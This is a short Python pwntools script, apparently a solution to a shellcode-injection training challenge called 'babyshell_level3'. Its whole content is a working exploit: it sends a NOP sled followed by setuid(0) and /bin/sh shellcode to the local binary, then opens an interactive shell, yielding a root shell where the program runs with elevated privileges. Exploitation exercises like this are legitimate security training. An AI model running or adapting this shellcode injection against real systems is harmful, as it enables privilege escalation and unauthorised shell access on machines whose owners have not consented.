from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

elf = ELF("./babyshell_level3")
p = process("./babyshell_level3")

# To avoid null bytes in 3rd Question 
# This shellcode doesnt have null bytes

payload = b"\x90"*30 + asm(shellcraft.setuid(0)) + asm(shellcraft.sh())

p.send(payload)

p.interactive()
